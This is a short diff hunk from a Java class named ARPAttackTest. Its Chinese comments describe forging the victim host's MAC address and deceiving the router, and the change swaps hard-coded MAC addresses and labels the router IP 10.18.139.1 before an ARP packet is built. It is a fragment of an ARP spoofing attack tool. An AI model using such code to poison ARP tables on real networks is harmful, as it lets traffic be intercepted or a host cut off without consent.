@@ -67,11 +67,11 @@ public class ARPAttackTest {
 
                 //// 篡改被攻击主机MAC地址 伪造的MAC地址必须是路由ARP记录里有的MAC地址，否则不会对主机产生影响
                 InetAddress srcip = InetAddress.getByName(ip);
-                byte[] srcmac = stomac("C8-E7-D8-CC-2B-CC");
+                byte[] srcmac = stomac("28-C2-DD-42-B9-D3");
 
                 //// 让路由器被欺骗
-                InetAddress desip = InetAddress.getByName("10.18.139.1");
-                byte[] desmac = stomac("8C-F2-28-38-07-7A");
+                InetAddress desip = InetAddress.getByName("10.18.139.1");//路由器的IP
+                byte[] desmac = stomac("00-23-89-1A-03-39");//路由器的MAC
 
                 // 设置ARP包
                 ARPPacket arp = new ARPPacket();
